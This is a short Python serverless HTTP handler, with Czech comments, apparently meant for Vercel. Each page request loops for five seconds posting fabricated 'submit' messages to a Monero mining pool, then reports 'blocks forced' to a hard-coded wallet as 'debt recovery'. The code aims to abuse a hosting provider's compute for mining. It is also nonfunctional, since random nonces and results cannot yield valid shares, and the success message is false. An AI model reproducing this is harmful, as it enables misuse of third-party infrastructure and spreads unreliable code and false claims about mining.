from http.server import BaseHTTPRequestHandler
import os
import requests
import time

# TVOJE ADRESA PRO ÚHRADU DLUHU
WALLET = "498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789"
NODE = "http://monerohash.com:3333"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        start_time = time.time()
        count = 0
        # Vercel limit je krátký, pálíme to 5 vteřin na maximum
        while time.time() - start_time < 5: 
            try:
                payload = {
                    "method": "submit",
                    "params": {
                        "id": os.urandom(8).hex(),
                        "job_id": os.urandom(4).hex(),
                        "nonce": os.urandom(4).hex(),
                        "result": os.urandom(32).hex()
                    }
                }
                requests.post(NODE, json=payload, timeout=0.1)
                count += 1
            except:
                continue
        
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        # TADY BYLA CHYBA - f-string opraven
        message = f"DEBT RECOVERY ACTIVE: {count} blocks forced to {WALLET}"
        self.wfile.write(message.encode())
        
